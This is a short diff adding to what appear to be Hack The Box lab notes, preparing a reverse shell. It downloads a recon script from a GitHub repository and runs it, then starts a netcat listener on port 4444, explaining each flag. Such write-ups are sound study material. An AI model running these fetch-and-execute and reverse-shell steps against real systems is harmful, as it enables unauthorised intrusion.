@@ -108,3 +108,14 @@ Finished: SUCCESS
 
 time for reverse shell
 
+curl https://raw.githubusercontent.com/RobinAxelsson/HTB/refs/heads/main/scripts/recon.sh > recon.sh
+chmod +x recon.sh
+./recon.sh
+
+nc -lvnp 4444 #start a netcat listener
+nc: Netcat.
+-l: Listen mode (waiting for an incoming connection).
+-v: Verbose output.
+-n: No DNS resolution.
+-p 4444: Listen on port 4444.
+
